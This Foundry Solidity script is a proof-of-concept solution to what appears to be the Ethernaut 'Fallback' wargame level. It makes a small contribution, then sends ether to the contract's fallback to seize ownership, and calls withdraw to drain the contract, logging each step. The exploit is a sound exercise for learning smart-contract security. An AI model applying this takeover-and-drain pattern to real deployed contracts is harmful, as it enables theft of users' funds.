// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/console.sol";
import "forge-std/Script.sol";
import "../src/1_Fallback.sol";

contract POC is Script {
    Fallback public target;

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        target = Fallback(payable(0xf0A15A2B895afaf4bC5245D4865AA9ef5AB0D63e));
        uint256 owner_value = target.contributions(address(target.owner()));
        console.log("owner balance: ", owner_value);
        console.log("you have to try ", owner_value / 0.001 ether, "times");
        
        address owner_addr = target.owner();
        console.log("before change owner: ", owner_addr);
        
        target.contribute{value : 0.0001 ether}();
        address(target).call{value : 0.001 ether}("");

        owner_addr = target.owner();
        console.log("after  change owner: ", owner_addr);

        uint256 target_balance = address(target).balance;
        console.log("before target balance: ", target_balance);

        target.withdraw();

        target_balance = address(target).balance;
        console.log("after  target balance: ", target_balance);

        vm.stopBroadcast();
    }
}